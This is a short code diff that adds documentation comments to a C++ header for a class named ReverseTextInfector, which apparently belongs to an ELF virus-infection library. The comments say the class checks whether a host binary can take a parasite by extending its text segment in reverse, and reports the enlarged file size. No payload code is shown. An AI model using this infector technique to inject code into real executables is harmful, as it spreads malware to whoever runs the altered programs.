@@ -77,8 +77,15 @@ namespace vf::infector {
 // into history books.
 class ReverseTextInfector {
  public:
+  // Return the size of the binary after a successful infection. This algorithm
+  // will increase the file size.
   size_t injected_host_size();
 
+  // Scan the elf to see if it can be injected with a parasite by extending the
+  // text segment in reverse order.
+  // @param host_mapping The host elf mapping.
+  // @param parasite_size The size of the parasite.
+  // @return True if the host binary can be injected.
   bool analyze(std::span<const std::byte> host_mapping,
                std::span<const std::byte> parasite_mapping);
 
